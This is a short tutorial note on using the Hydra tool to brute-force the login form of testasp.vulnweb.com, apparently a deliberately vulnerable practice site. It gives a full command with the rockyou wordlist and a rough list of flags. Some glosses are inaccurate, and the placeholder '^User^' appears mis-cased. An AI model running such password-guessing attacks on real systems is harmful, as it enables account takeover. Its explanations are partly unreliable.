# BruteForce_Hydra

Target: http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
Login name: admin

Command: 
## hydra -l admin -P /usr/share/wordlists/rockyou.txt http://testasp.vulnweb.com/ http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^User^&tfUPass=^PASS^:S=logout" -vV -f

How hydra is build:

[-l LOGIN|-L FILE] [-p PASS|-P FILE] [-u] [-f] [IP ADDRESS] [-s PORT] [MODULE] [URL]

1. [-l LOGIN|-L FILE]: Using login name or dictionary 
2. [-p PASS|-P FILE]: using password or dictionary
3. [-u]: every user  
4. [-f]: stop on first name
5. [IP ADDRESS]: IP-ADDRESS/WEBSITE 
6. [-s PORT]: Target Port
7. [MODULE]: Which section (ssh, http, etc.)
8. [URL]: WEB-ADDRESS
9. 
